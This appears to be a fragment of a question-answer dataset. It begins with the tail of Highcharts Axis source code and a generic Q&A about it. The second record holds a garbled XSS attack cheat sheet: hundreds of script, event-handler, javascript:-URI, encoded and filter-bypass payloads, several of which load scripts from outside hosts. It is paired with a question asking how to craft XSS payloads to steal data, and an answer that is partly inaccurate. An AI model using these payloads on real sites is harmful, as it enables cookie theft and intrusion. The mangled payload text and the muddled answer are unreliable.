options.snap, true), chart = this.chart;\n        var path, pos, categorized, graphic = this.cross, crossOptions;\n        fireEvent(this, 'drawCrosshair', { e: e, point: point });\n        if (!e) {\n            e = this.cross && this.cross.e;\n        }\n        if (\n        // Disabled in options\n       !options ||\n            // Snap\n            ((defined(point) ||!snap) === false)) {\n            this.hideCrosshair();\n        }\n        else {\n            // Get the path\n            if (!snap) {\n                pos = e &&\n                    (this.horiz?\n                        e.chartX - this.pos :\n                        this.len - e.chartY + this.pos);\n            }\n            else if (defined(point)) {\n                // #3834\n                pos = pick(this.coll!== 'colorAxis'?\n                    null, this.isXAxis?\n                    point.plotX :\n                    this.len - point.plotY);\n            }\n            if (defined(pos)) {\n                crossOptions = {\n                    // value, only used on radial\n                    value: point && (this.isXAxis?\n                        point.x :\n                        pick(point.stackY, point.y)),\n                    translatedValue: pos\n                };\n                if (chart.polar) {\n                    extend(crossOptions, {\n                        isCrosshair: true,\n                        chartX: e && e.chartX,\n                        chartY: e && e.chartY,\n                        point: point\n                    });\n                }\n                path = this.getPlotLinePath(crossOptions) ||\n                    null; // #3189\n            }\n            if (!defined(path)) {\n                this.hideCrosshair();\n                return;\n            }\n            categorized = this.categories &&!this.isRadial;\n            if (!graphic) {\n                this.cross = graphic = chart.renderer\n                   .path()\n                   .addClass('highcharts-crosshair highcharts-crosshair-' +\n                    (categorized? 'category': 'thin ') +\n                    (options.className || ''))\n                   .attr({\n                    zIndex: pick(options.zIndex, 2)\n                })\n                   .add();\n                // Presentational attributes\n                if (!chart.styledMode) {\n                    graphic.attr({\n                        stroke: options.color ||\n                            (categorized?\n                                Color\n                                   .parse(\"#ccd6eb\"\n)\n                                   .setOpacity(0.25)\n                                   .get() :\n                                \"#cccccc\"\n),\n                       'stroke-width': pick(options.width, 1)\n                    }).css({\n                        'pointer-events': 'none'\n                    });\n                    if (options.dashStyle) {\n                        graphic.attr({\n                            dashstyle: options.dashStyle\n                        });\n                    }\n                }\n            }\n            graphic.show().attr({\n                d: path\n            });\n            if (categorized &&!options.width) {\n                graphic.attr({\n                   'stroke-width': this.transA\n                });\n            }\n            this.cross.e = e;\n        }\n        fireEvent(this, 'afterDrawCrosshair', { e: e, point: point });\n    };\nAxis.prototype.hideCrosshair = function () {\n        if (this.cross) {\n            this.cross.hide();\n        }\n        fireEvent(this, 'afterHideCrosshair');\n    };\nAxis.prototype.hasVerticalPanning = function () {\n        var panningOptions = this.chart.options.chart.panning;\n        return Boolean(panningOptions &&\n            panningOptions.enabled && // #14624\n            /y/.test(panningOptions.type));\n    };\nAxis.prototype.validatePositiveValue = function (value) {\n        return isNumber(value) && value > 0;\n    };\nAxis.prototype.update = function (options, redraw) {\n        var chart = this.chart;\n        options = merge(this.userOptions, options);\n        this.destroy(true);\n        this.init(chart, options);\n        chart.isDirtyBox = true;\n        if (pick(redraw, true)) {\n            chart.redraw();\n        }\n    };\nAxis.prototype.remove = function (redraw) {\n        axisSeries = this.series;\n        var i = axisSeries.length;\n        while (i--) {\n            if (axisSeries[i]) {\n                axisSeries[i].remove(false);\n            }\n        }\n        // Remove the axis\n        erase(chart.axes, this);\n        erase(chart[key], this);\n        chart[key].forEach(function (axis, i) {\n            // Re-index, #1706, #8075\n            axis.options.index = axis.userOptions.index = i;\n        });\n        this.destroy();\n        chart.isDirtyBox = true;\n        if (pick(redraw, true)) {\n            chart.redraw();\n        }\n    };\nAxis.prototype.setTitle = function (titleOptions, redraw) {\n        this.update({ title: titleOptions }, redraw);\n    };\nAxis.prototype.setCategories = function (categories, redraw) {\n        this.update({ categories: categories }, redraw);\n    };\nAxis.defaultOptions = AxisDefaults.defaultXAxisOptions;\n    // Properties to survive after destroy, needed for Axis.update (#4317,\n    // #5773, #5881).\n    Axis.keepProps = ['extKey', 'hcEvents', 'names','series', 'userMax', 'userMin'];\n    return Axis;\n}());\n/* *\n *\n *  Default Export\n *\n * */\nexport default Axis;", "question": " What is the purpose of the custom Axis object in the given text?", "answer": " The purpose of the custom Axis object in the given text is to implement the axis functionality in Highcharts. It handles the rendering and layout of the axis, handles tick positions, handles rendering of grid lines and tick labels, etc. It abstracts the logic for creating and managing the different types of axes like X, Y, color, etc. The custom Axis object provides the main axis logic for Highcharts.\n\nSo in summary, the purpose of the custom Axis object is to encapsulate the logic for handling the axes in Highcharts, allowing the chart to be created and rendered without having to directly manage the axes themselves."}
{"text": "xss payload\nxss ,f12,xss payload,,,, 1.: scriptalert(1)script 2.url: %22img src=1 onerror =alert(xss) 3., javascript:alert(1) \"onmo seover=\"alert(1)  onmo seover   onmo seover=\"alert(1)\" 4. view plaincopyprint onmo seover=alert(1) payloads: img src=1onmo seover=alert(1) a herf=1onload=alert(1)xxa bodyonhashchange=alert(1)ahref=#clickit () objectdata=\"data:textlbase64,phnjcmlwdcbzcmm9ahr0cdovl3q y24vukd1v0reuz48l3njcmlwdd4=\"object \"svgonload=alert(1) inp txss(a tofoc s,hidden,) 112\" name=javascript:alert(1)a tofoc s onfoc s=location= 112\" name=javascript:alert1a tofoc s onfoc s=location=   note: this is a technical attack sheet for cross site penetrationtests. cross site scripting strings with tag: meta http-eq iv=\"refresh\" content=\"0 rl=javascript:doc ment.cookie=tr e\" meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" scriptdoc ment.cookie=tr escript img src=\"jav ascript:doc ment.cookie=tr e\" img src=\"javascript:doc ment.cookie=tr e\" img src=\" javascript:doc ment.cookie=tr e\" body onload#$%&-_.,:@[|]^=doc ment.cookie=tr e scriptdoc ment.cookie=tr escript script bdoc ment.cookie=tr escript img src=\"javascript:doc ment.cookie=tr e\" iframe src=\"javascript:doc ment.cookie=tr e scripta=crosssitescriptingndoc ment.cookie=tr escript titlescriptdoc ment.cookie=tr escript input type=\"image\" src=\"javascript:doc ment.cookie=tr e\" body background=\"javascript:doc ment.cookie=tr e\" body onload=doc ment.cookie=tr e img dynsrc=\"javascript:doc ment.cookie=tr e\" img lowsrc=\"javascript:doc ment.cookie=tr e\" bgsound src=\"javascript:doc ment.cookie=tr e\" br size=\"&{doc ment.cookie=tr e}\" layer src=\"javascript:doc ment.cookie=tr e\"layer link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e\")styleullicrosssitescripting scriptdoc ment.cookie=tr escript iframe src=\"javascript:doc ment.cookie=tr e\"iframe framesetframe src=\"javascript:doc ment.cookie=tr e\"frameset table background=\"javascript:doc ment.cookie=tr e\" tabletd background=\"javascript:doc ment.cookie=tr e\" div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e)\" div style=\"width: expression(doc ment.cookie=tr e)\" style@import javascript:doc ment.cookie=tr e style img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" expa style= nocrosssitescripting:nocrosssitescripting(\"\")crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  style type=\"textjavascript\"doc ment.cookie=tr estyle style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")}stylea class=crosssitescriptinga style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style scriptdoc ment.cookie=tr escript base href=\"javascript:doc ment.cookie=tr e\" object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject xml ixc[[img src=\"javas[[cript:doc ment.cookie=tr e\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span lbodyxml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl  echo( scr) echo( iptdoc ment.cookie=tr escript )  headmeta http-equiv=\"content-type\" content=\"textl charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e+adw-script+ad4- a href=\"javascript#doc ment.cookie=tr e\" div onmo seover=\"doc ment.cookie=tr e\" [](javascript:doc ment.cookie=tr e) [](javascript:doc ment.cookie=tr e) inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e\" bgso nd src=\"javascript:doc ment.cookie=tr e\" &scriptdoc ment.cookie=tr escript &{doc ment.cookie=tr e} img src=&{doc ment.cookie=tr e} link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" a href=\"abo t:scriptdoc ment.cookie=tr escript\" body onload=\"doc ment.cookie=tr e\" div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" div style=\"behavio r: rl([link to code])\" div style=\"binding: rl([link to code])\" div style=\"width: expression(doc ment.cookie=tr e)\" style type=\"textjavascript\"doc ment.cookie=tr estyle object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e\" stylescript scriptdoc ment.cookie=tr escript scriptdoc ment.cookie=tr e--script scriptdoc ment.cookie=tr escript img src=\"blah\" onmo seover=\"doc ment.cookie=tr e\" xml src=\"javascript:doc ment.cookie=tr e\" xml \"x\"abscriptdoc ment.cookie=tr escriptbaxml div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ][[ [xc0][xbc]scriptdoc ment.cookie=tr e[xc0][xbc]script cross site scripting strings with close tag: \"meta http-eq iv=\"refresh\" content=\"0 rl=javascript:doc ment.cookie=tr e\" \"meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" \"scriptdoc ment.cookie=tr escript \"img src=\"jav ascript:doc ment.cookie=tr e\" \"img src=\"javascript:doc ment.cookie=tr e\" \"img src=\" javascript:doc ment.cookie=tr e\" \"body onload#$%&-_.,:@[|]^=doc ment.cookie=tr e \"scriptdoc ment.cookie=tr escript \"script bdoc ment.cookie=tr escript \"img src=\"javascript:doc ment.cookie=tr e\" \"iframe src=\"javascript:doc ment.cookie=tr e \"scripta=crosssitescriptingndoc ment.cookie=tr escript \"titlescriptdoc ment.cookie=tr escript \"input type=\"image\" src=\"javascript:doc ment.cookie=tr e\" \"body background=\"javascript:doc ment.cookie=tr e\" \"body onload=doc ment.cookie=tr e \"img dynsrc=\"javascript:doc ment.cookie=tr e\" \"img lowsrc=\"javascript:doc ment.cookie=tr e\" \"bgsound src=\"javascript:doc ment.cookie=tr e\" \"br size=\"&{doc ment.cookie=tr e}\" \"layer src=\"javascript:doc ment.cookie=tr e\"layer \"link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" \"styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e\")styleullicrosssitescripting \"scriptdoc ment.cookie=tr escript \"iframe src=\"javascript:doc ment.cookie=tr e\"iframe \"framesetframe src=\"javascript:doc ment.cookie=tr e\"frameset \"table background=\"javascript:doc ment.cookie=tr e\" \"tabletd background=\"javascript:doc ment.cookie=tr e\" \"div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" \"div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e)\" \"div style=\"width: expression(doc ment.cookie=tr e)\" \"style@import javascript:doc ment.cookie=tr e style \"img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" \"crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" \"expa style= nocrosssitescripting:nocrosssitescripting(\"\")crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  \"style type=\"textjavascript\"doc ment.cookie=tr estyle \"style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")}stylea class=crosssitescriptinga \"style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style \"scriptdoc ment.cookie=tr escript \"base href=\"javascript:doc ment.cookie=tr e\" \"object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject \"xml ixc[[img src=\"javas[[cript:doc ment.cookie=tr e\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan \"xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span \"lbodyxml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl \" echo( scr) echo( iptdoc ment.cookie=tr escript )  \"headmeta http-equiv=\"content-type\" content=\"textl charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e+adw-script+ad4- \"a href=\"javascript#doc ment.cookie=tr e\" \"div onmo seover=\"doc ment.cookie=tr e\" \"[](javascript:doc ment.cookie=tr e) \"[](javascript:doc ment.cookie=tr e) \"inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e\" \"bgso nd src=\"javascript:doc ment.cookie=tr e\" \"&scriptdoc ment.cookie=tr escript \"&{doc ment.cookie=tr e} \"img src=&{doc ment.cookie=tr e} \"link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" \" \" \"a href=\"abo t:scriptdoc ment.cookie=tr escript\" \"body onload=\"doc ment.cookie=tr e\" \"div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" \"div style=\"behavio r: rl([link to code])\" \"div style=\"binding: rl([link to code])\" \"div style=\"width: expression(doc ment.cookie=tr e)\" \"style type=\"textjavascript\"doc ment.cookie=tr estyle \"object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e\" \"stylescript \"scriptdoc ment.cookie=tr escript \"scriptdoc ment.cookie=tr e--script \"scriptdoc ment.cookie=tr escript \" \"img src=\"blah\" onmo seover=\"doc ment.cookie=tr e\" \"xml src=\"javascript:doc ment.cookie=tr e\" \"xml \"x\"abscriptdoc ment.cookie=tr escriptbaxml \"div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ][[ [xc0][xbc]scriptdoc ment.cookie=tr e[xc0][xbc]script cross site scripting strings with negative val e & tag: -1meta http-eq iv=\"refresh\" content=\"0 rl=javascript:doc ment.cookie=tr e\" -1meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" -1scriptdoc ment.cookie=tr escript -1img src=\"jav ascript:doc ment.cookie=tr e\" -1img src=\"javascript:doc ment.cookie=tr e\" -1img src=\" javascript:doc ment.cookie=tr e\" -1body onload#$%&-_.,:@[|]^=doc ment.cookie=tr e -1scriptdoc ment.cookie=tr escript -1script bdoc ment.cookie=tr escript -1img src=\"javascript:doc ment.cookie=tr e\" -1iframe src=\"javascript:doc ment.cookie=tr e -1scripta=crosssitescriptingndoc ment.cookie=tr escript -1titlescriptdoc ment.cookie=tr escript -1input type=\"image\" src=\"javascript:doc ment.cookie=tr e\" -1body background=\"javascript:doc ment.cookie=tr e\" -1body onload=doc ment.cookie=tr e -1img dynsrc=\"javascript:doc ment.cookie=tr e\" -1img lowsrc=\"javascript:doc ment.cookie=tr e\" -1bgsound src=\"javascript:doc ment.cookie=tr e\" -1br size=\"&{doc ment.cookie=tr e}\" -1layer src=\"javascript:doc ment.cookie=tr e\"layer -1link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" -1styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e\")styleullicrosssitescripting -1scriptdoc ment.cookie=tr escript -1iframe src=\"javascript:doc ment.cookie=tr e\"iframe -1framesetframe src=\"javascript:doc ment.cookie=tr e\"frameset -1table background=\"javascript:doc ment.cookie=tr e\" -1tabletd background=\"javascript:doc ment.cookie=tr e\" -1div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" -1div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e)\" -1div style=\"width: expression(doc ment.cookie=tr e)\" -1style@import javascript:doc ment.cookie=tr e style -1img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" -1crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" -1expa style= nocrosssitescripting:nocrosssitescripting(\"\")crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  -1style type=\"textjavascript\"doc ment.cookie=tr estyle -1style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")}stylea class=crosssitescriptinga -1style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style -1scriptdoc ment.cookie=tr escript -1base href=\"javascript:doc ment.cookie=tr e\" -1object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject -1xml ixc[[img src=\"javas[[cript:doc ment.cookie=tr e\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan -1xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span -1lbodyxml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl -1 echo( scr) echo( iptdoc ment.cookie=tr escript )  -1headmeta http-equiv=\"content-type\" content=\"textl charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e+adw-script+ad4- -1a href=\"javascript#doc ment.cookie=tr e\" -1div onmo seover=\"doc ment.cookie=tr e\" -1[](javascript:doc ment.cookie=tr e) -1[](javascript:doc ment.cookie=tr e) -1inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e\" -1bgso nd src=\"javascript:doc ment.cookie=tr e\" -1&scriptdoc ment.cookie=tr escript -1&{doc ment.cookie=tr e} -1img src=&{doc ment.cookie=tr e} -1link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e\" -1 -1 -1a href=\"abo t:scriptdoc ment.cookie=tr escript\" -1body onload=\"doc ment.cookie=tr e\" -1div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e)\" -1div style=\"behavio r: rl([link to code])\" -1div style=\"binding: rl([link to code])\" -1div style=\"width: expression(doc ment.cookie=tr e)\" -1style type=\"textjavascript\"doc ment.cookie=tr estyle -1object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e\" -1stylescript -1scriptdoc ment.cookie=tr escript -1scriptdoc ment.cookie=tr e--script -1scriptdoc ment.cookie=tr escript -1 -1img src=\"blah\" onmo seover=\"doc ment.cookie=tr e\" -1xml src=\"javascript:doc ment.cookie=tr e\" -1xml \"x\"abscriptdoc ment.cookie=tr escriptbaxml -1div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ][[ [xc0][xbc]scriptdoc ment.cookie=tr e[xc0][xbc]script cross site scripting strings restriction bypass mail: \"iframe src=http:v  \"scriptalert(doc ment.cookie)scriptdiv style=\" \"scriptalert(doc ment.cookie)script@gmail.com iframe src=http:v  scriptalert(doc ment.cookie)scriptdiv style=\" scriptalert(doc ment.cookie)script@gmail.com cross site scripting strings restriction bypass phone: +49\"iframe src=http:v 1337 \"iframe src= onload=alert( mphone ) iframe src=http:v 1337+1 cross site scripting strings restriction bypass obf scation \"scriptalert(\"vlab\")script \"iframe src=http:v  cross site scripting strings restriction bypass string to charcode lbody b tton.onclick=\"alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108, 101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1 10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62))\"string:fr om.char.codeb ttonbodyl alert(string.fromcharcode(88,83,83)) alert(string.fromcharcode(88,83,83))\"alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))\"alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))--script\" scriptalert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))script --\"crosssitescripting=&{} cross site scripting strings restriction bypass encoded frame rl %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%43%72%6f %73%73%53%69%74%65%53%63%72%69%70%74%69%6e%67%32%22%29%3c%2f %73%63%72%69%70%74%3e cross site scripting strings via console: set vlan name 1337 scriptalert(doc ment.cookie)script set system name iframe src=  set system location \"iframe src=a onload=alert(\"vl\")  set system contact scriptalert( vl )script insert scriptalert(doc ment.cookie)script add add ser scriptalert(doc ment.cookie)script scriptalert(doc ment.cookie)script@gmail.com add topic iframe src=  add name scriptalert( vl )script perl -e print \"img src=java0script:alert(\"crosssitescripting\")\"  o t perl -e print \"scr0iptalert(\"crosssitescripting\")scr0ipt\"  o t cross site scripting strings on per line validation applications: img src = \" j a v a s c r i p t : a l e r t ( v l a b ) \" cross site scripting strings embed: embed src=\"http:v crosssitescripting.swf\" allowscriptaccess=\"always\"embed embed src=\"data:imagesvg+xmlbase64,phn2zyb4bwx czpzdmc9imh0dh a6ly93d3c dzm b3jnlziwmdavc3zniib4bwx cz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9 psixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==\" type=\"imagesvg+xml\" allowscriptaccess=\"always\"embed embed src=\"data:imagesvg+xmlbase64,phn2zyb4bwx czpzdmc9imh0dh a6ly93d3c dzm b3jnlziwmdavc3zniib4bwx cz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9 psixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==\" type=\"imagesvg+xml\" allowscriptaccess=\"always\"embed cross site scripting strings action script: object type=\"applicationx-shockwave-flash\" data=\" hack.swf\" width=\"300\" height=\"300\" param name=\"movie\" val e=\" \"  param name=\"q ality\" val e=\"high\"  param name=\"scale\" val e=\"noscale\"  param name=\"salign\" val e=\"lt\"  param name=\"allowscriptaccess\" val e=\"always\"  param name=\"men \" val e=\"false\"  object script src=http:v crosssitescripting.jsscript scriptalert(\"crosssitescripting\")script script src=http:v crosssitescripting.jsb script src=v.js scripta=crosssitescripting alert( rce)script script a=\"\" src=\"http:v crosssitescripting.js\"script script a= src=\"http:v crosssitescripting.js\"script scriptdoc ment.write(\"scri\")scriptpt src=\"http:v crosssitescripting.js\"script titlescriptalert(\"crosssitescripting\")script img src=\"javascript:alert( crosssitescripting )\" img src=javascript:alert( crosssitescripting ) img src=javascript:alert( crosssitescripting ) img src=javascript:alert(\"crosssitescripting\") img src=javascript:alert(\"rm crosssitescripting \") img scriptalert(\"crosssitescripting\")script\" img src=javascript:alert(string.fromcharcode(88,83,83)) img src=\"jav ascript:alert( crosssitescripting )\" img src=\"jav ascript:alert( crosssitescripting )\" img src=\"jav ascript:alert( crosssitescripting )\" img src=\"javascript:alert( crosssitescripting )\" img src=\" javascript:alert( crosssitescripting )\" img src=\"javascript:alert( crosssitescripting )\" img dynsrc=\"javascript:alert( crosssitescripting )\" img lowsrc=\"javascript:alert( crosssitescripting )\" img src= vbscript:msgbox(\"crosssitescripting\")  img src=\"mocha:[code]\" img src=\"livescript:[code]\" meta http-equiv=\"refresh\" content=\"0 rl=javascript:alert( crosssitescripting )\" meta http-equiv=\"refresh\" content=\"0 rl=data:textlbase64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k\" meta http-equiv=\"refresh\" content=\"0 url=( crosssitescripting )\" meta http-equiv=\"refresh\" content=\"0 rl=javascript:alert( crosssitescripting )\" meta http-equiv=\"refresh\" content=\"0 rl=data:textlbase64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k\" meta http-equiv=\"refresh\" content=\"0 url=( crosssitescripting )\" meta http-equiv=\"link\" content=\"http:v crosssitescripting.css rel=stylesheet\" meta http-equiv=\"set-cookie\" content=\"userscriptalert( crosssitescripting )script\" headmeta http-equiv=\"content-type\" content=\"textl charset=utf-7\" head+adw-script+ad4-alert( crosssitescripting )+adw-script+ad4- object type=\"textx-scriptlet\" data=\"http:v scriptletl\"object object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:alert( crosssitescripting )object style@import javascript:alert(\"crosssitescripting\") style style@import http:v crosssitescripting.css style style type=\"textjavascript\"alert( crosssitescripting )style style.crosssitescripting{backgro nd-image: rl(\"javascript:alert( crosssitescripting )\")}stylea class=crosssitescriptinga style type=\"textcss\"body{backgro nd: rl(\"javascript:alert( crosssitescripting )\")}style styleli {list-style-image: rl(\"javascript:alert( crosssitescripting )\")}styleullicrosssitescripting stylebody{-moz-binding: rl(\"http:v crosssitescriptingmoz.xml#crosssitescripting\")}style div style=\"backgro nd-image: rl(javascript:alert( crosssitescripting ))\" div style=\"backgro nd-image:00750072006c0028 006a006100760061007300630072006900700074003a0061006c0065007200740028.10270058.1053005300270029 0029\" div style=\"backgro nd-image: rl( javascript:alert( crosssitescripting ))\" div style=\"width: expression(alert( crosssitescripting ))\" layer src=\"http:v scriptl\"layer link rel=\"stylesheet\" href=\"javascript:alert( crosssitescripting )\" link rel=\"stylesheet\" href=\"http:v crosssitescripting.css\" body background=\"javascript:alert( crosssitescripting )\" body onload=alert( crosssitescripting ) body onload#$%&*-_.,:@[|]^=alert(\"crosssitescripting\") iframe src=http:v indexl  table background=\"javascript:alert( crosssitescripting )\" tabletd background=\"javascript:alert( crosssitescripting )\" bgsound src=\"javascript:alert( crosssitescripting )\" br size=\"&{alert( crosssitescripting )}\" a href=\"\"crosssitescriptinga a href=\"\"crosssitescriptinga a href=\"\"crosssitescriptinga a href=\"javascript:doc ment.location=   \"crosssitescriptinga base href=\"javascript:alert( crosssitescripting )\" \"alert( crosssitescripting ) input type=\"image\" src=\"javascript:alert( crosssitescripting )\" crosssitescripting style=\"behavior: rl(crosssitescripting.htc)\" scriptalert(crosssitescripting)script img style=\"crosssitescripting:exprcrosssitescriptingession(alert( crosssitescripting ))\" crosssitescripting style=\"crosssitescripting:expression(alert( crosssitescripting ))\" expa style= nocrosssitescripting:nocrosssitescripting(\"\") crosssitescripting:excrosssitescripting*pression(alert(\"crosssitescripting\"))  a=\"get\" b=\"url(\"\" c=\"javascript:\" d=\"alert( crosssitescripting )\")\" eval(v+l+a+b) l xmlns:crosssitescripting import namespace=\"crosssitescripting\" implementation=\"\" crosssitescripting:crosssitescriptingcrosssitescriptingcrosssitescripting:crosssitescripting xml ixc[[img src=\"javas][[[[cript:alert( crosssitescripting )\"][[ cxxmlspan datasrc=#i datafld=c dataformatas=lspan xml \"crosssitescripting\"ibimg src=\"javascript:alert( crosssitescripting )\"bixml span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span xml src=\"crosssitescriptingtest.xml\" ixmlspan datasrc=#i datafld=c dataformatas=lspan lbody xml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\" import namespace=\"t\" implementation=\"#defa lt#time2\" t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferalert(\"crosssitescripting\")script\" bodyl script src=\"http:v crosssitescripting.jpg\"script  echo( scr)  echo( iptalert(\"crosssitescripting\")script )  img src=\" file.php", "question": " What are some techniques for creating cross-site scripting (XSS) payloads, and what are some ways to bypass security measures to steal sensitive information or perform malicious actions?", "answer": "\n\n        Cross-site scripting (XSS) is a technique used by attackers to inject malicious code into websites or web applications. Some techniques for creating XSS payloads include:\n\n1. scriptalert(1) - This is the simplest and most basic XSS payload. It can be used to steal sensitive information or perform malicious actions.\n\n2. URL encoding - By encoding sensitive data in URLs, attackers can bypass security measures and inject malicious code into websites.\n\n3. Using onload or onmouseover events - These events can be used to inject malicious code that runs when the page loads or when the mouse pointer hovers over an element.\n\n4. Using the document.cookie property - The cookie property can be manipulated to steal sensitive information or perform malicious actions.\n\n5. Using XMLHttpRequest (XHR) - By injecting malicious code into an XHR request, attackers can steal sensitive information or perform malicious actions.\n\nSome ways to bypass security measures to steal sensitive information or perform malicious actions include:\n\n1. Using encoding techniques - By encoding sensitive data in URLs, attackers can bypass security measures and inject malicious code into websites.\n\n2. Using onload or onmouseover events - These events can be used to inject malicious code that runs when the page loads or when the mouse pointer hovers over an element.\n\n3. Using the document.cookie property - The cookie property can be manipulated to steal sensitive information or perform malicious actions.\n\n4. Using XMLHttpRequest (XHR) - By injecting malicious code into an XHR request, attackers can steal sensitive information or perform malicious actions.\n\nIn summary, XSS attacks can be dangerous and can lead to the theft of sensitive information or the performance of malicious actions. It is important to protect against XSS attacks by using security measures such as input validation and output encoding."}
